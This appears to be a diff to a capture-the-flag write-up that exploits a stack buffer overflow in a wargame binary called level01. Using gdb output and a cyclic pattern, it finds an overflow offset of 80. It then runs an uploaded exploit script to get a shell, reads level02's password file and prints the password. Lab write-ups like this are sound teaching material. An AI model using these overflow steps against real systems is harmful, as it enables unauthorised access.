@@ -29,42 +29,27 @@ The piece of code of interest is:
     0x80486b0:	 "admin"
 
 If we simply write "admin" it would not work as intended, we'll see error message "nope, incorrect username..."
-The thing is no matter what pasword is entered program willnot call /bin/sh cause that how it works.
+The thing is no matter what pasword is entered program will not call /bin/sh.
 
 This line says that fget will read 0x64 (100) characters, when buffer's allocated size is only 16
    0x08048565 <+149>:   movl   $0x64,0x4(%esp)
 ---> p /d 0x64
     $8 = 100
 
-Thus we can make buffer overflow attack,  
+Thus we can make buffer overflow attack, let's finf offset with the use of buffer overflow pattern generator
 
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: dat_wil
 verifying username....
 
 Enter Password: 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
+nope, incorrect password...
 
-Breakpoint 1, 0x0804857d in main ()
----> x/200xb $esp
-...
-0xffffd658:     0xac    0xd6    0xff    0xff    0x41    0x41    0x41    0x41
-0xffffd660:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
-0xffffd668:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
-0xffffd670:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
-0xffffd678:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
-0xffffd680:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
-0xffffd688:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
-0xffffd690:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
-0xffffd698:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
-0xffffd6a0:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
-0xffffd6a8:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
-0xffffd6b0:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
-0xffffd6b8:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x00
-...
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
 
-so our buffer starts at 0xffffd658
-We can also find that size is 92, and ends at 0xf7e4000a
+Offset is 80
 
 ---> info functions 
     ...
@@ -98,15 +83,19 @@ Mapped address spaces:
 This info is used in pyton script, which will be copied and run
 ---> scp -P 4242 ./level01/exploit.py level01@localhost:/tmp/ 
 ---> ( python /tmp/exploit.py; cat ) | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
 
-$ whoami
+Enter Password: 
+nope, incorrect password...
+
+whoami
 level02
-$ cat /home/users/level02/.pass
+cat /home/users/level02/.pass
 PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
 $ su level02
 Password: 
 Password: 
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
-
-We found our flag!
